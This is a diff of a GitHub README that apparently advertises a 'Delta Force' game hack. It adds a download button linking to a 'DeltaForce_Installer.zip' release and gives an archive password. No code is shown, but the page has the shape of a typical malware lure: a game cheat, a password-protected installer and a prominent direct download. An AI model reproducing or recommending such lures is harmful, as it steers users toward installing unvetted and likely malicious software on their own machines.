@@ -6,13 +6,26 @@
 ##  PASSWORD: SectorSilo
 
 
-<a href="YOUR_DOWNLOAD_LINK">
-  <img width="160" alt="download_button_cropped" src="https://github.com/user-attachments/assets/2c1f38cb-77c9-483b-a3a4-0ff0d5a33714" />
-</a>
+<div align="center">
 
+  <img
+    width="474"
+    alt="Delta Force"
+    src="https://github.com/user-attachments/assets/ff15341b-9927-4d50-b219-62f3b483017e"
+  />
 
+  <br><br>
 
-<img width="474" height="331" alt="image" src="https://github.com/user-attachments/assets/0e537fb6-2d4c-46c0-941c-ee4a04a27da2" />
+  <a href="https://github.com/WantDeputyStage/DeltaForce-Hack-2026/releases/download/Latest/DeltaForce_Installer.zip">
+    <img
+      width="160"
+      alt="Download"
+      src="https://github.com/user-attachments/assets/c541e077-e932-44d1-b6d4-2a52eb980eee"
+    />
+  </a>
+
+</div>
+
 
 
 ## Integrating The  Biggest ModPAck+External
